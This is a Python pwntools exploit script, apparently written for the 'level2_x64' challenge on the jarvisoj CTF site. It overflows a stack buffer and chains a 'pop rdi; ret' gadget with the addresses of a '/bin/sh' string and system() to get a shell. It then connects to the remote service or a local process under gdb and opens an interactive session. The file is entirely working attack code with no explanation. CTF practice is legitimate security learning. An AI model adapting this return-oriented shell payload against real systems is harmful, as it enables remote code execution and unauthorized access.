#!/usr/bin/python

from pwn import *

def exploit2():
    global io
    global elf

    #system_addr = elf.plt['system']
    system_addr = 0x4004bc
    binsh_addr  = 0x0000000000600A90
    gadget_addr = 0x00000000004006b3
    
    payload   = 'A' * 0x80
    payload  += 'A' * 0x8         # ebp 
    payload  += p64(gadget_addr)  # pop rdi;ret
    payload  += p64(binsh_addr)   # system_addr
    payload  += p64(system_addr)   # system_addr

    
    sleep(0.5)
    io.sendline(payload)
    # get shell
    io.interactive()

if __name__ == '__main__':
    target_elf = './level2_x64.04d700633c6dc26afc6a1e7e9df8c94e'
    #target_libc = './libc-2.23.so'

    target_host = 'pwn2.jarvisoj.com'
    target_port = '9882'

    #context.log_level = 'debug'
    #context.terminal = ['tmux', 'splitw', '-v']

    elf = ELF(target_elf)
    #libc = ELF(target_libc)

    LOCAL = True
    LOCAL = False

    if LOCAL:
        #io = process(target_elf, env={'LD_PRELOAD':target_libc})
        io = process(target_elf)
        gdb.attach(io, 
        '''b *0x0000000000400619
#b *0x00000000004005A6''')
    else:
        io = remote(target_host, target_port)
    
    exploit2()


